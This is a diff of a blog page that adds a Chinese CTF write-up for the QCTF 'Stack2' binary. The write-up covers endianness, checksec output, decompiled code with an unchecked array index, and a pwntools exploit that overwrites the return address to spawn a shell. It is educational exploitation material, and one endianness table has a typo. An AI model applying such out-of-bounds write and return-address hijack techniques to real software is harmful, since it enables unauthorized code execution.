@@ -72,7 +72,7 @@
 
     
         <meta property="article:published_time" content="7月 16, 2018" />
-        <meta property="article:modified_time" content="7月 16, 2018" />
+        <meta property="article:modified_time" content="7月 18, 2019" />
     
 
     <!-- The Twitter Card protocol -->
@@ -113,7 +113,7 @@
     "headline": "QCTF-writeup",
     "url": "http://iosmosis.github.io/2018/07/16/QCTF-writeup/index.html",
     "datePublished": "7月 16, 2018",
-    "dateModified": "7月 16, 2018",
+    "dateModified": "7月 18, 2019",
     "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -343,7 +343,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Stack2"><span class="post-toc-number">1.</span> <span class="post-toc-text">Stack2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用思路："><span class="post-toc-number">1.1.</span> <span class="post-toc-text">利用思路：</span></a></li></ol></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -490,7 +490,180 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>垃圾的我被stack坑了许久</p>
+        <h2 id="Stack2"><a href="#Stack2" class="headerlink" title="Stack2"></a>Stack2</h2><p>知识点</p>
+<p>大小端序</p>
+<p>大端模式（Big-endian）：高位字节排放在内存的低地址端，低位字节排放在内存的高地址端，即正序排列，高尾端；</p>
+<p>小端模式（Little-endian）：低位字节排放在内存的低地址端，高位字节排放在内存的高地址端，即逆序排列，低尾端；</p>
+<p>列子：</p>
+<p>16bit宽的数0x1234在两种模式CPU内存中的存放方式（假设从地址0x4000开始存放）为：</p>
+<table>
+<thead>
+<tr>
+<th>内存地址</th>
+<th>小端模式存放内容</th>
+<th>大端存放模式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x4000</td>
+<td>0x34</td>
+<td>0x12</td>
+</tr>
+<tr>
+<td>0x4001</td>
+<td>0x12</td>
+<td>0x32</td>
+</tr>
+</tbody>
+</table>
+<p>32bit宽的数0x12345678在两种模式CPU内存中的存放方式（假设从地址0x4000开始存放）为：</p>
+<table>
+<thead>
+<tr>
+<th>内存地址</th>
+<th>小端模式存放内容</th>
+<th>大端存放模式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x4000</td>
+<td>0x78</td>
+<td>0x12</td>
+</tr>
+<tr>
+<td>0x4001</td>
+<td>0x56</td>
+<td>0x34</td>
+</tr>
+<tr>
+<td>0x4002</td>
+<td>0x34</td>
+<td>0x56</td>
+</tr>
+<tr>
+<td>0x4003</td>
+<td>0x12</td>
+<td>0x78</td>
+</tr>
+</tbody>
+</table>
+<p>首先checksec</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/attack_word$ checksec stack2
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/attack_word/stack2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+ios@ubuntu:~/APwn/attack_word$
+</code></pre>
+<p>开启 canary nx 32位</p>
+<p>ida 分析函数</p>
+<p>来看核心逻辑</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+           <span class="token keyword">break</span><span class="token punctuation">;</span>
+         <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>
+         <span class="token punctuation">{</span>
+           v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>
+           v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+         <span class="token punctuation">}</span>
+       <span class="token punctuation">}</span>
+       <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
+         <span class="token keyword">break</span><span class="token punctuation">;</span>
+       <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
+         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">}</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+   <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
+     <span class="token keyword">break</span><span class="token punctuation">;</span>
+   v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+   <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
+     v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>
+</code></pre>
+<p>注意change number处 未做验证id是否存在 而是直接赋值给v5接着使v13[v5]处的地址等于v7的地址</p>
+<p>还给出了一个函数</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hackhere</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为v5 v7可控所以可以通过控制v5到返回地址前4位从而达到写入恶意函数到返回地址处</p>
+<p>查看可控v5距离ebp的偏移</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>
+<span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>
+</code></pre>
+<p>可以看到j距离ebp的偏移 为0x84</p>
+<p>所以向v13[0x84]处开始往后写即可覆盖return_addr</p>
+<p>但是由于此处为int型参数所以传地址需要注意</p>
+<p>需要利用小端序进行修改return_addr</p>
+<p>exp：</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./stack2'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#p=remote('111.198.29.45',40850)</span>
+offset<span class="token operator">=</span><span class="token number">0x84</span>
+
+<span class="token keyword">def</span> <span class="token function">r</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'5. exit\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'which number to change:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'new number:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many numbers you have:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Give me your numbers\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
+offset<span class="token operator">+=</span><span class="token number">8</span>
+r<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
+r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'5. exit\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>这里要注意 我这里并未直接调用bash函数而是自己构造了个system(‘sh’)</p>
+<p>构造也很简单 return地址修改为system.plt 地址 、抬高地址在system()前写入参数sh地址</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>rodata<span class="token punctuation">:</span><span class="token number">08048980</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span><span class="token number">08048980</span> command         db <span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token number">0</span>        <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> hackhere<span class="token operator">+</span><span class="token number">14</span>↑o
+<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span>0804898A                 align <span class="token number">4</span>
+</code></pre>
+<p>可以看到/bin/bash地址为0x8048980</p>
+<p>所以可以推出sh的地址0x8048987</p>
+<p>写入即可完成利用</p>
 
     
 
@@ -616,7 +789,7 @@
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2019/03/">三月 2019<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/02/">二月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+                <a class="sidebar_archives-link" href="/archives/2019/07/">七月 2019<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/03/">三月 2019<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/02/">二月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
             </ul>
         </li>
         
